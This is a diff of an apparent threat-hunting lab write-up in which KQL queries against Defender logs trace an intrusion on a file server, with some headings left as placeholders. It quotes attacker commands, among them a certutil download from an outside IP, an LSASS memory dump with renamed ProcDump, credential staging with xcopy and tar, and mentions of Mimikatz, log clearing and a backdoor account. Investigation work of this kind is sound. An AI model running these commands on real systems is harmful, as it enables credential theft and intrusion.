@@ -126,7 +126,7 @@ DeviceProcessEvents
 
 ---
 
-### 6. Discovery: Network Configuration Command
+### 6. Discovery: Network Configuration 
 
 Searched for evidence of network configuration enumeration and discovered that the attacker utilized the command ""ipconfig.exe" /all" to better understand the environment topology. This command reveals comprehensive network details including DNS servers, DHCP configuration, domain membership, MAC addresses, and all network adapters, providing the attacker with a complete picture of the network environment.
 
@@ -145,7 +145,7 @@ DeviceProcessEvents
 
 ---
 
-### 7. Defense Evasion: Directory Hiding Command & Staging Directory Path
+### 7. Defense Evasion: Directory Hiding & Staging Directory Path
 
 Searched for evidence of the modification of file system attributes since this is a technique employed by attackers to hide directories. This analysis revealed that the attacker modified file attributes to hide their staging directory utilizing the command ""attrib.exe" +h +s C:\Windows\Logs\CBS" and made it appear as a protected Windows system component. This command sets both hidden (+h) and system (+s) attributes on the directory, causing it to blend in with legitimate Windows system folders. The CBS (Component-Based Servicing) folder name was chosen to appear as a legitimate Windows log directory. In addition, the staging directory path was C:\Windows\Logs\CBS. This staging directory was created in a location designed to masquerade as legitimate Windows system logs, making it less likely to be discovered during casual system inspection.
  
@@ -164,7 +164,7 @@ DeviceProcessEvents
 
 ---
 
-### 8. Defense Evasion: Script Download Command
+### 8. Defense Evasion: Script Download 
 
 Searched for evidence of malware download activity and discovered that the attacker utilized certutil.exe, a legitimate Windows certificate management utility, to download a PowerShell script (i.e., "ex.ps1") to the hidden staging directory using the following command: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1.
 
@@ -183,99 +183,103 @@ DeviceProcessEvents
 
 ---
 
-### 9. XXXXX
+### 9. Collection: Credential File Discovery
 
-Searched for executables downloaded to the staging directory since credential dumping tools are typically used to extract authentication secrets from system memory and dicovered a credential dumping tool with the filename mm.exe.
+Searched for evidence of credential file creation and discovered that the attacker created a credential file (i.e., IT-Admin-Passwords.csv)in the staging directory. This file contains exported credentials (e.g., IT administrator passwords), likely harvested from password managers, browser storage, or credential stores. The descriptive filename indicates the attacker organized their stolen data for easy identification during exfiltration.
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
+| where FolderPath has "CBS"
+| where FileName endswith ".csv"
+| project TimeGenerated, FileName, FolderPath, ActionType
+
+```
+<img width="2160" height="275" alt="CH_Q11" src="https://github.com/user-attachments/assets/5522277f-9363-41b3-a2a5-9e97016cc7ff" />
+
+---
+
+### 10. Collection: Recursive Copy  
+
+Searched for evidence of bulk data collection activities and discovered that the attacker used xcopy to recursively copy entire file share directories to the staging location using the following command: xcopy C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y. This command specifically targeted the IT-Admin share containing credential files and administrative documentation.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
-| where DeviceName == "azuki-sl"
-| where ProcessCommandLine has "WindowsCache"
-| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
+| where ProcessCommandLine has_any ("robocopy", "xcopy")
+| project TimeGenerated, DeviceName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ```
-<img width="2649" height="809" alt="POE_QR12" src="https://github.com/user-attachments/assets/ec341bc9-d013-4018-a73d-124968bf3465" />
+<img width="2175" height="669" alt="CH_Q12" src="https://github.com/user-attachments/assets/19c0aeca-93d0-44df-afde-b0b72eb9e728" />
 
 ---
+### 11. Collection: Compression
 
-### 10. XXXXX 
-
-Searched for command line arguments passed to the credential dumping tool to identify the specific module used to extract passwords from memory and discovered that the Mimikatz module "sekurlsa::logonpasswords" was used by the attacker to extract credentials from LSASS (Local Security Authority Subsystem Service) memory.
+Searched for evidence of archive creation and discovered that the attacker used tar (i.e., a cross-platform compression tool not native to legacy Windows environments) to compress the staged credentials. The attacker utilized the following command to compress the IT-Admin credentials folder into a portable .tar.gz format suitable for exfiltration: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
-| where DeviceName == "azuki-sl"
-| where ProcessCommandLine has "mm.exe"
-| project TimeGenerated, ProcessCommandLine
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
+| where ProcessCommandLine has_any ("7z", "tar", "rar")
+| project TimeGenerated, DeviceName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ```
-<img width="1948" height="330" alt="POE_QR13" src="https://github.com/user-attachments/assets/68801ab9-e4f7-4af6-b358-05a3104f9bed" />
+<img width="2284" height="884" alt="CH_Q13" src="https://github.com/user-attachments/assets/275f8aa9-8da4-450c-bc71-e41f052f2c22" />
 
 ---
-### 11. Collection & Exfiltration: Data Staging Archive & Exfiltration Channel
 
-Searched for evidence of ZIP file creation in the staging directory during the collection phase since attackers compress stolen data for efficient exfiltration. The compressed archive export-data.zip was created in the staging directory and prepared for exfiltration via the curl upload command. In addition, the attacker utilized Discord's webhook API to exfiltrate the compressed archive. Discord is a legitimate communication platform commonly allowed through firewalls, making this exfiltration technique effective for bypassing network security controls.
+### 12. Credential Access: Renamed Tool
+
+Searched for evidence of executable file creation events in attacker-controlled directories in order to identify renamed credential dumping tools since this is a common OPSEC practice used for evading signature-based detection. This analysis revealed that the attacker renamed a credential dumping tool to a short, inconspicuous name (i.e., "pd.exe") that could blend in with program data or system processes.
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
+| where DeviceName == "azuki-fileserver01"
+| where FileName endswith ".exe"
+| where FolderPath has "Windows\\Logs\\CBS"
+| where ActionType == "FileCreated"
+| project TimeGenerated, FileName, FolderPath, ActionType
+| order by TimeGenerated asc
+
+```
+<img width="2203" height="283" alt="CH_Q14" src="https://github.com/user-attachments/assets/65c498e1-7125-4ff3-a2f7-ce552eab5d3f" />
+
+---
+
+### 13. Credential Access: Memory Dump 
+
+Searched for evidence of credential dumping activities and discovered that ProcDump (renamed to pd.exe) was used to dump LSASS process memory using the command: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp. LSASS memory contains credentials for logged-on users, enabling the attacker to extract plaintext and hashed passwords for privilege escalation and lateral movement.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
-| where DeviceName == "azuki-sl"
-| where ProcessCommandLine has "WindowsCache" and ProcessCommandLine has ".zip"
-| project TimeGenerated, ProcessCommandLine
+| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
+| where DeviceName == "azuki-fileserver01"
+| where FileName == "pd.exe" or ProcessCommandLine has "pd.exe"
+| project TimeGenerated, DeviceName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ```
-<img width="2476" height="295" alt="POE_QR14" src="https://github.com/user-attachments/assets/67ec2819-d3c6-44a3-a555-7eb03abc7f03" />
+<img width="1940" height="293" alt="CH_Q15" src="https://github.com/user-attachments/assets/f4dc6421-1080-4885-99dc-04814ddbb47a" />
 
 ---
 
-### 12. Anti-Forensics: Log Tampering
-
-Searched for event log clearing commands since attackers clear event logs in order to destroy forensic evidence and impede investigation efforts. In this case, the attacker cleared event logs in sequence, starting with the Security log (which contains logon events and credential access evidence), followed by System and Application logs.
-
-**Query used to locate events:**
-
-```kql
-DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
-| where DeviceName == "azuki-sl"
-| where FileName == "wevtutil.exe"
-| where ProcessCommandLine has "cl"
-| project TimeGenerated, ProcessCommandLine
-| sort by TimeGenerated asc
-
-```
-<img width="2209" height="398" alt="POE_QR15" src="https://github.com/user-attachments/assets/2331376e-d9b6-47d6-97b2-86eb63556def" />
-
----
-
-### 13. Impact: Persistence Account
-
-Searched for evidence of account creation since hidden administrator accounts provide alternative access for future campaigns. The backdoor account "support" was created and added to the local Administrators group. It's clear that the account name was chosen to blend in with legitimate IT support accounts, providing persistent administrative access for future operations.
-
-**Query used to locate events:**
-
-```kql
-DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
-| where DeviceName == "azuki-sl"
-| where ProcessCommandLine has "/add" 
-| project TimeGenerated, ProcessCommandLine
-| sort by TimeGenerated asc
-
-```
-<img width="1766" height="464" alt="POE_QR17" src="https://github.com/user-attachments/assets/d10608a1-c7bf-4d0e-815d-735fbb1c3da1" />
-
----
-
-### 14. Execution: Malicious Script
+### 14. XXX
 
 Searched for script files created in temporary directories since attackers often use scripting languages to automate their attack chain and identifying the initial attack script reveals the entry point and automation method used in the compromise. The PowerShell script wupdate.ps1 was created in the user's temporary directory and used to automate the attack chain. The filename was disguised to resemble a Windows update utility, enabling execution without raising suspicion.
 
